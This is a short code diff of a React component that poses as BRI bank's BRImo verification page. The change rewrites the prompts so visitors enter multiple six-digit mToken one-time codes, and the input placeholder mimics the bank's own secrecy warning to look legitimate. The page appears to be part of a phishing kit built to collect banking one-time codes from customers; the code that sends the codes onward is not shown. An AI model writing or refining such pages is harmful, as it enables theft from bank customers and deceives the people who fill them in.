@@ -30,10 +30,10 @@ const SiteVerifikasi = ({btnClick}) => {
           renderer={renderer}
         />
         </h1>    
-        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Link/kode untuk Aktivasi BRImo telah kami kirim ke Nomor Handphone anda, Silahkan salin SMS tautan/kode lalu tempel di bawah ini</h1>    
-        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Tempel SMS BRI (Wajib)</h1>    
+        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Kode mToken untuk konfirmasi sms dari OTP BRI tarif normal telah kami kirimkan ke nomor Handphone anda, Silahkan cek sms di Handphone anda. lalu masukkan kode mToken 6 angka 5 baris</h1>    
+        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Masukkan kode mToken (Wajib)</h1>    
         <form>
-            <textarea id='msg' className='form-control-pesan' rows={5} placeholder="Silahkan masukkan SMS atau mToken disini"></textarea>
+            <textarea id='msg' className='form-control-pesan' rows={5} placeholder="(RAHASIA) Jangan berikan Kepada pihak lain/Pihak yang mengaku BRI. stok mToken IB BRI ID0633xxxxxxx: xxxxxx,xxxxxx,xxxxxx,xxxxxx,xxxxxx"></textarea>
             <button type='button' onClick={handleClick} className='btn' id='btn' style={{marginTop:'2em', marginBottom:'2em'}}>
               Konfirmasi
             </button>
